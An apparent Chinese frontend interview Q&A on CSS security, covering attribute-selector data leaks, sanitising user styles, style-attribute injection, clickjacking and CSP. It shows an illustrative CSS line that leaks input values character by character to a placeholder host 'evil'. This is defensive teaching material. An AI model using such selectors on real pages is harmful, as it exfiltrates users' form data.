---
title: [CSS-367] CSS 安全面：注入风险与防御
date: 2026-11-21
categories: [CSS]
tags: [前端面试, 面试题, 安全]
type: 面试题
---

## CSS-367：CSS 安全面：注入风险与防御

**答**：
- 数据外泄向量：CSS 属性值可拼 URL 发起请求——攻击者把页面内容编码进 attribute selector 触发不同资源加载（`input[value^="a"] { background: url(/leak?a) }`）逐字符探测——CSP 阻断 style 里的外域请求 + 禁止用户自定义样式拼 URL
- 用户自定义样式输入（主题色/自定义 CSS）：白名单解析（只允许颜色/长度 token）、长度限制、过滤 url() 与 @import——自研 mini parser 或用成熟的 sanitizer
- style 属性注入：innerHTML 中 style 可以藏 `background:url(//evil)` 表达式——输出编码同样适用于样式属性值
- 点击劫持相关：CSS 透明覆盖（opacity:0 iframe）是 clickjacking 载体——框架 X-Frame-Options/CSP frame-ancestors 防嵌入
- 与 CSP 配合：style-src 'unsafe-inline' 要尽量收敛为 nonce/hash；CSS 里的 @import 外链也受 style-src 管——配置 review 时别漏

```css
/* 攻击示意(防御视角): 逐字符探测 */
input[value^="s"] { background-image: url(https://evil/leak?s); }

/* 防御: CSP 限制样式源 */
/* Content-Security-Policy: style-src 'self' 'nonce-abc'; */
```

```javascript
// 主题色白名单解析
function safeColor(input) {
  return /^(#[0-9a-f]{3,8}|(oklch|rgb)a?\([\d\s%,.]+\))$/i.test(input) ? input : '#1677ff';
}
```
